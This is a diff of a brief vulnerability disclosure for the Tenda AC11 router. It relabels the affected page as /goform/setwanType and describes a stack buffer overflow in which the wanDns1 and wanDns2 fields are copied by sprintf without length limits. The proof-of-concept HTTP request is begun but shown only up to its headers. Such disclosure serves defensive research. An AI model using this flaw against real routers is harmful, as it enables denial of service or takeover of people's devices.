@@ -1,8 +1,8 @@
 # Tenda Router AC11 Vulnerability
-The Vulnerability is in `/goform/setWifi` page which influence the lastest version routerOS(RTOS, This is system different from linux system)[AC11_V02.03.01.104_CN](https://www.tenda.com.cn/download/detail-3163.html)
+The Vulnerability is in `/goform/setwanType` page which influence the lastest version routerOS(RTOS, This is system different from linux system)[AC11_V02.03.01.104_CN](https://www.tenda.com.cn/download/detail-3163.html)
 
 ## Vulnerability description
-In the page `/gofrom/setWifi` have one stack buffer overflow vulnerability.
+In the page `/gofrom/setwanType` have one stack buffer overflow vulnerability.
 
 1. It isn't limit our input when we input `wanDns1` in `v12` and `wanDns2` in `v13`.
 2. Then `v12` and `v13` will copy to a stack value `v45` by using `sprintf_1(v45, "%s %s", v12, v13);` .%s couldn't limit copy length ,so wo can make stack buffer overflow in `v45`
@@ -11,7 +11,7 @@ In the page `/gofrom/setWifi` have one stack buffer overflow vulnerability.
 ## poc 
 
 ```
-POST /goform/setWifi HTTP/1.1
+POST /goform/setwanType HTTP/1.1
 Host: 192.168.0.1
 Content-Length: 717
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
